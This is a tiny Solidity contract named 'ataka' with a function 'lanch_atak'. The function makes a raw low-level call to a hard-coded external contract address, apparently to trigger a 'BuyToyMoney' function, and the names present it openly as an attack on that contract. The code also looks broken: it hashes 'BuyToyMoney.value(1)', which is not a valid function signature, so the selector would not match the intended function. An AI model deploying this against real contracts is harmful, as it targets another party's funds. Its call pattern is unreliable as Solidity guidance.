pragma solidity 0.4.18;
contract ataka{
    address wad=0xC9e0478b39Dbb74d5725a590e6A0B0a79e0D49fD;
  function lanch_atak() public{
 wad.call(bytes4(keccak256("BuyToyMoney.value(1)")));
  }  
}